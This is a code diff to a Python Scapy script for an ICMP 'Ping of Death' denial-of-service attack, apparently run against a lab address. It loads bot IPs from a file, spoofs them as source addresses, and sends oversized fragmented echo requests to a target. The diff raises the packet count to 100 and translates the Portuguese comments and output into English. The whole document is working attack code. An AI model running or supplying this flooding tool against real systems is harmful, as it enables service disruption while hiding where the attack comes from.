@@ -3,9 +3,10 @@ import random
 import time
 import ipaddress
 
-# Ataque ICMP Flood, sem payload (mínimo), spoofing de IP.
+# ICMP Ping of Death
 TARGET_IP = "192.168.100.2"
-BOTFILE = "bots.txt"
+BOTFILE = "../bots.txt"
+NUM_PACKETS = 100
 PAYLOAD_SIZE = 65600
 
 def load_bots(filename):
@@ -28,10 +29,10 @@ def run_icmp_POD():
         source_ip = random.choice(bot_ips)
         ip_layer = IP(src=source_ip, dst=TARGET_IP)
         eth_layer = Ether()
-        icmp_layer = ICMP(type=8, code=0) / os.urandom(PAYLOAD_SIZE)  # Echo Request COM PAYLOAD 2^16
+        icmp_layer = ICMP(type=8, code=0) / os.urandom(PAYLOAD_SIZE)  # Echo Request PAYLOAD 2^16
         pkt = ip_layer / icmp_layer
 
-        # Fragmentar em pedaços de 1480 bytes
+        # Frag
         frags = fragment(pkt, fragsize=1480)
 
         for frag in frags:
@@ -39,7 +40,7 @@ def run_icmp_POD():
 
         numero_de_pacotes_enviados += 1
 
-        if numero_de_pacotes_enviados == 1:
+        if numero_de_pacotes_enviados == NUM_PACKETS:
             break
 
 
@@ -48,8 +49,8 @@ def run_icmp_POD():
     end_time = time.perf_counter()
     duration = end_time - start_time
 
-    print(f"\nEnvio concluído.")
-    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")
+    print(f"\nSending completed.")
+    print(f"Total time to send packets: {duration:.4f} seconds")
 
 if __name__ == "__main__":
     run_icmp_POD()
